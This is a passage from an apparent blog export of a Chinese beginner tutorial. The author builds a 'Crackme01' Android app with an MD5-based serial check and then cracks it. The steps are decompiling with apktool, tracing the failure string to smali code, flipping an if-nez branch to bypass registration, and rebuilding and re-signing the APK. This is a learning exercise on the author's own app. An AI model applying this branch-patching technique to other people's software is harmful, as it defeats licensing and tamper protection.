rel=\"external\">gradle-3.3</a>），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。</p>\n</blockquote>\n<p>打开app/res/layout/activity_main.xml,设计layout。</p>\n<p>采用Android最新的约束性布局ConstraintLayout。</p>\n<p><img src=\"/2017/07/Android开发及破解入门实例/constraintLayout.png\" alt=\"设计效果\"><br>具体的xml代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class=\"line\">&lt;android.support.constraint.ConstraintLayout</div><div class=\"line\">    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</div><div class=\"line\">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</div><div class=\"line\">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</div><div class=\"line\">    android:layout_width=&quot;match_parent&quot;</div><div class=\"line\">    android:layout_height=&quot;match_parent&quot;</div><div class=\"line\">    tools:context=&quot;cn.oddboy.xx.crackme01.MainActivity&quot;</div><div class=\"line\">    tools:layout_editor_absoluteY=&quot;81dp&quot;</div><div class=\"line\">    tools:layout_editor_absoluteX=&quot;0dp&quot;&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView&quot;</div><div class=\"line\">        android:layout_width=&quot;368dp&quot;</div><div class=\"line\">        android:layout_height=&quot;25dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_androidInstance&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textAllCaps=&quot;false&quot;</div><div class=\"line\">        android:textSize=&quot;18sp&quot;</div><div class=\"line\">        android:textStyle=&quot;bold&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView2&quot;</div><div class=\"line\">        android:layout_width=&quot;wrap_content&quot;</div><div class=\"line\">        android:layout_height=&quot;17dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_serialNo&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textSize=&quot;14sp&quot;</div><div class=\"line\">        app:layout_constraintBottom_toBottomOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintRight_toLeftOf=&quot;@+id/sn&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView3&quot;</div><div class=\"line\">        android:layout_width=&quot;wrap_content&quot;</div><div class=\"line\">        android:layout_height=&quot;17dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_username&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textSize=&quot;14sp&quot;</div><div class=\"line\">        app:layout_constraintBottom_toBottomOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintRight_toLeftOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;EditText</div><div class=\"line\">        android:id=&quot;@+id/sn&quot;</div><div class=\"line\">        android:layout_width=&quot;215dp&quot;</div><div class=\"line\">        android:layout_height=&quot;43dp&quot;</div><div class=\"line\">        android:ems=&quot;10&quot;</div><div class=\"line\">        android:hint=&quot;@string/str_input16chars&quot;</div><div class=\"line\">        android:inputType=&quot;textPersonName&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/button&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/userName&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;EditText</div><div class=\"line\">        android:id=&quot;@+id/userName&quot;</div><div class=\"line\">        android:layout_width=&quot;215dp&quot;</div><div class=\"line\">        android:layout_height=&quot;43dp&quot;</div><div class=\"line\">        android:ems=&quot;10&quot;</div><div class=\"line\">        android:hint=&quot;@string/str_pleaseinputusername&quot;</div><div class=\"line\">        android:inputType=&quot;textPersonName&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintLeft_toRightOf=&quot;@+id/textView3&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/textView&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;Button</div><div class=\"line\">        android:id=&quot;@+id/button&quot;</div><div class=\"line\">        android:layout_width=&quot;88dp&quot;</div><div class=\"line\">        android:layout_height=&quot;48dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_register&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        android:layout_marginTop=&quot;-13dp&quot;</div><div class=\"line\">        app:layout_constraintHorizontal_bias=&quot;0.858&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;/android.support.constraint.ConstraintLayout&gt;</div></pre></td></tr></table></figure></p>\n<p>打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div></pre></td><td class=\"code\"><pre><div class=\"line\">package cn.oddboy.xx.crackme01;</div><div class=\"line\"></div><div class=\"line\">import android.support.v7.app.AppCompatActivity;</div><div class=\"line\">import android.os.Bundle;</div><div class=\"line\">import android.view.View;</div><div class=\"line\">import android.widget.Button;</div><div class=\"line\">import android.widget.EditText;</div><div class=\"line\">import android.widget.Toast;</div><div class=\"line\"></div><div class=\"line\">import java.security.MessageDigest;</div><div class=\"line\">import java.security.NoSuchAlgorithmException;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">public class MainActivity extends AppCompatActivity &#123;</div><div class=\"line\"></div><div class=\"line\">    @Override</div><div class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class=\"line\">        super.onCreate(savedInstanceState);</div><div class=\"line\">        setContentView(R.layout.activity_main);</div><div class=\"line\">        setTitle(R.string.unregister);</div><div class=\"line\">        final EditText edit_userName=(EditText)findViewById(R.id.userName);</div><div class=\"line\">        final EditText edit_sn=(EditText)findViewById(R.id.sn);</div><div class=\"line\">        final Button btn_reg=(Button)findViewById(R.id.button);</div><div class=\"line\">        btn_reg.setOnClickListener(new View.OnClickListener() &#123;</div><div class=\"line\">            @Override</div><div class=\"line\">            public void onClick(View view) &#123;</div><div class=\"line\">                if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) &#123;</div><div class=\"line\">                    Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show();</div><div class=\"line\">                &#125;else &#123;</div><div class=\"line\">                    Toast.makeText(MainActivity.this,</div><div class=\"line\">                            R.string.successed,Toast.LENGTH_SHORT).show();</div><div class=\"line\">                    btn_reg.setEnabled(false);</div><div class=\"line\">                    setTitle(R.string.registered);</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\">        &#125;);</div><div class=\"line\">    &#125;</div><div class=\"line\">    public static String bytesToHex(byte[] in) &#123;</div><div class=\"line\">        final StringBuilder builder = new StringBuilder();</div><div class=\"line\">        for(byte b : in) &#123;</div><div class=\"line\">            builder.append(String.format(&quot;%02x&quot;, b));</div><div class=\"line\">        &#125;</div><div class=\"line\">        return builder.toString();</div><div class=\"line\">    &#125;</div><div class=\"line\">    private boolean checkSN(String userName, String sn)&#123;</div><div class=\"line\">        try&#123;</div><div class=\"line\">            if ((userName==null)||(userName.length()==0))</div><div class=\"line\">                return false;</div><div class=\"line\">            if ((sn==null)||(sn.length()==0))</div><div class=\"line\">                return false;</div><div class=\"line\">            MessageDigest digest=MessageDigest.getInstance(&quot;MD5&quot;);</div><div class=\"line\">            digest.reset();</div><div class=\"line\">            digest.update(userName.getBytes());</div><div class=\"line\">            byte[] bytes=digest.digest();</div><div class=\"line\">            String hexstr= bytesToHex(bytes);</div><div class=\"line\">            StringBuilder sb = new StringBuilder();</div><div class=\"line\">            for (int i=0;i&lt;hexstr.length();i+=2)&#123;</div><div class=\"line\">                sb.append(hexstr.charAt(i));</div><div class=\"line\">            &#125;</div><div class=\"line\">            String userSN=sb.toString();</div><div class=\"line\">            if (!userSN.equalsIgnoreCase(sn))</div><div class=\"line\">                return false;</div><div class=\"line\">        &#125; catch (NoSuchAlgorithmException e)&#123;</div><div class=\"line\">            e.printStackTrace();</div><div class=\"line\">            return false;</div><div class=\"line\">        &#125;</div><div class=\"line\">        return true;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>app/res/values/strings.xml<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;resources&gt;</div><div class=\"line\">    &lt;string name=&quot;app_name&quot;&gt;Crackme01&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;successed&quot;&gt;恭喜您！注册成功&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_register&quot;&gt;注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_androidInstance&quot;&gt;Android程序破解演示实例&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_username&quot;&gt;用户名&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_serialNo&quot;&gt;注册码&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_pleaseinputusername&quot;&gt;请输入用户名&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_input16chars&quot;&gt;请输入16位注册码&lt;/string&gt;</div><div class=\"line\">&lt;/resources&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"让程序Run起来\"><a href=\"#让程序Run起来\" class=\"headerlink\" title=\"让程序Run起来\"></a>让程序Run起来</h2><p>在AS中run - Run”app”，如果没有虚拟机，可以新建一个。<br><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_01.png\" alt=\"RUN起来\"></p>\n<h2 id=\"发布APK\"><a href=\"#发布APK\" class=\"headerlink\" title=\"发布APK\"></a>发布APK</h2><ul>\n<li><p>“Build -&gt; Build APK” 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名）</p>\n</li>\n<li><p>“Build -&gt; Generate Signed APK”。选择keystore然后Next就可以了。</p>\n<p>  <img src=\"/2017/07/Android开发及破解入门实例/Screenshot_02.png\" alt=\"生成keystore\"><br>  此处也可以用keytool工具生成keystore文件。命令如下：</p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"APK逆向\"><a href=\"#APK逆向\" class=\"headerlink\" title=\"APK逆向\"></a>APK逆向</h2><blockquote>\n<p>  APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。</p>\n</blockquote>\n<ul>\n<li>apktool  用于反编译和重新编译</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  apktool d crackme01.apk</div><div class=\"line\">I: Using Apktool 2.2.3 on crackme01.apk</div><div class=\"line\">I: Loading resource table...</div><div class=\"line\">I: Decoding AndroidManifest.xml with resources...</div><div class=\"line\">I: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apk</div><div class=\"line\">I: Regular manifest package...</div><div class=\"line\">I: Decoding file-resources...</div><div class=\"line\">I: Decoding values */* XMLs...</div><div class=\"line\">I: Baksmaling classes.dex...</div><div class=\"line\">I: Copying assets and libs...</div><div class=\"line\">I: Copying unknown files...</div><div class=\"line\">I: Copying original files...</div></pre></td></tr></table></figure>\n<ul>\n<li><p>把整个生成的crackme01文件夹拽入visual studio code中。</p>\n</li>\n<li><p>搜索关键字”无效用户名或注册码”，在res/values/strings.xml中找到:</p>\n<blockquote>\n<pre><code>&lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt;\n</code></pre></blockquote>\n</li>\n<li>搜索关键字”unsucessed”,在res/values/public.xml中找到:<blockquote>\n<pre><code>&lt;public type=&quot;string&quot; name=&quot;unsucessed&quot; id=&quot;0x7f06002b&quot; /&gt;\n</code></pre></blockquote>\n</li>\n<li>搜索关键字”0x7f06002b”,在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。</li>\n</ul>\n<p><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_03.png\" alt=\"smali代码\"></p>\n<ul>\n<li><p>具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。</p>\n</li>\n<li><p>重新生成APK</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  apktool b crackme01</div><div class=\"line\">I: Using Apktool 2.2.3</div><div class=\"line\">I: Checking whether sources has changed...</div><div class=\"line\">I: Smaling smali folder into classes.dex...</div><div class=\"line\">I: Checking whether resources has changed...</div><div class=\"line\">I: Building resources...</div><div class=\"line\">I: Building apk file...</div><div class=\"line\">I: Copying unknown files/dir...</div><div class=\"line\"># 生成的APK在crackme01/dist/crackme01.apk</div></pre></td></tr></table></figure>\n</li>\n<li><p>重新签名</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa</div><div class=\"line\">输入密钥库的密码短语:</div><div class=\"line\">   正在添加: META-INF/MANIFEST.MF</div><div class=\"line\">   正在添加: META-INF/AAA.SF</div><div class=\"line\">   正在添加: META-INF/AAA.RSA</div><div class=\"line\">  正在签名: AndroidManifest.xml</div><div class=\"line\">  正在签名: classes.dex</div><div class=\"line\">  ......</div><div class=\"line\">  正在签名: resources.arsc</div><div class=\"line\">jar 已签名。</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_04.png\" alt=\"安装到虚拟机上运行\"></p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><pre><code>路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。\n</code></pre>","site":{"data":{}},"excerpt":"<blockquote>\n<p>  原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。  结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。</p>\n</blockquote>\n<h2 id=\"开发环境安装\"><a href=\"#开发环境安装\" class=\"headerlink\" title=\"开发环境安装\"></a>开发环境安装</h2><p><a href=\"https://developer.android.com\">Android开发者官网</a></p>\n<p><a href=\"https://developer.android.com/studio/index.html\">Android Studio下载页面</a></p>\n<p><a href=\"https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-ide-162.4069837-mac.dmg\">Android Studio 2.3.3.0 for mac下载直连</a></p>\n<p><a href=\"https://developer.android.com/ndk/downloads/index.html\">Android NDK</a> # 其实这个工具在这里并没有用到，可以等后续再下载安装。</p>\n<p># Android Studio包含了JDK，故而不需要单独安装JDK。<br>上述链接应该是都需要翻墙才能访问。</p>","more":"<h2 id=\"项目编码\"><a href=\"#项目编码\" class=\"headerlink\" title=\"项目编码\"></a>项目编码</h2><p>打开AS，一路Next，就新建好一个项目。</p>\n<blockquote>\n<p>  第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（<a href=\"https://services.gradle.org/distributions/gradle-3.3-all.zip\">gradle-3.3</a>），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。</p>\n</blockquote>\n<p>打开app/res/layout/activity_main.xml,设计layout。</p>\n<p>采用Android最新的约束性布局ConstraintLayout。</p>\n<p><img src=\"/2017/07/Android开发及破解入门实例/constraintLayout.png\" alt=\"设计效果\"><br>具体的xml代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class=\"line\">&lt;android.support.constraint.ConstraintLayout</div><div class=\"line\">    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</div><div class=\"line\">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</div><div class=\"line\">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</div><div class=\"line\">    android:layout_width=&quot;match_parent&quot;</div><div class=\"line\">    android:layout_height=&quot;match_parent&quot;</div><div class=\"line\">    tools:context=&quot;cn.oddboy.xx.crackme01.MainActivity&quot;</div><div class=\"line\">    tools:layout_editor_absoluteY=&quot;81dp&quot;</div><div class=\"line\">    tools:layout_editor_absoluteX=&quot;0dp&quot;&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView&quot;</div><div class=\"line\">        android:layout_width=&quot;368dp&quot;</div><div class=\"line\">        android:layout_height=&quot;25dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_androidInstance&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textAllCaps=&quot;false&quot;</div><div class=\"line\">        android:textSize=&quot;18sp&quot;</div><div class=\"line\">        android:textStyle=&quot;bold&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView2&quot;</div><div class=\"line\">        android:layout_width=&quot;wrap_content&quot;</div><div class=\"line\">        android:layout_height=&quot;17dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_serialNo&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textSize=&quot;14sp&quot;</div><div class=\"line\">        app:layout_constraintBottom_toBottomOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintRight_toLeftOf=&quot;@+id/sn&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView3&quot;</div><div class=\"line\">        android:layout_width=&quot;wrap_content&quot;</div><div class=\"line\">        android:layout_height=&quot;17dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_username&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textSize=&quot;14sp&quot;</div><div class=\"line\">        app:layout_constraintBottom_toBottomOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintRight_toLeftOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;EditText</div><div class=\"line\">        android:id=&quot;@+id/sn&quot;</div><div class=\"line\">        android:layout_width=&quot;215dp&quot;</div><div class=\"line\">        android:layout_height=&quot;43dp&quot;</div><div class=\"line\">        android:ems=&quot;10&quot;</div><div class=\"line\">        android:hint=&quot;@string/str_input16chars&quot;</div><div class=\"line\">        android:inputType=&quot;textPersonName&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/button&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/userName&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;EditText</div><div class=\"line\">        android:id=&quot;@+id/userName&quot;</div><div class=\"line\">        android:layout_width=&quot;215dp&quot;</div><div class=\"line\">        android:layout_height=&quot;43dp&quot;</div><div class=\"line\">        android:ems=&quot;10&quot;</div><div class=\"line\">        android:hint=&quot;@string/str_pleaseinputusername&quot;</div><div class=\"line\">        android:inputType=&quot;textPersonName&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintLeft_toRightOf=&quot;@+id/textView3&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/textView&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;Button</div><div class=\"line\">        android:id=&quot;@+id/button&quot;</div><div class=\"line\">        android:layout_width=&quot;88dp&quot;</div><div class=\"line\">        android:layout_height=&quot;48dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_register&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        